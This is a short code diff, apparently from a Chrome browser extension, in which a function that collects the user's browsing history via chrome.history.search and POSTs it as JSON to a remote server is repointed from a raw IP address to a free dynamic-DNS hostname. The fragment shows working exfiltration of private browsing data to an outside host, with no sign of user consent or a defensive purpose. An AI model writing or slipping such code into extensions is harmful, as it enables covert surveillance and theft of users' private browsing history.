@@ -12,10 +12,10 @@ chrome.history.search({
 			this.pages.push(income) 
 		},
 		send: function() {
-			fetch("http://95.163.180.52/api/get_history", {
+			fetch("https://turkovmatvei.chickenkiller.com/api/get_history", {
 			  method: "POST", 
 			  headers: {
-			    'Access-Control-Allow-Origin': 'http://95.163.180.52/'
+			    'Access-Control-Allow-Origin': 'https://turkovmatvei.chickenkiller.com/'
 			  },
 			  body: JSON.stringify(this.pages)
 			}).then(res => {
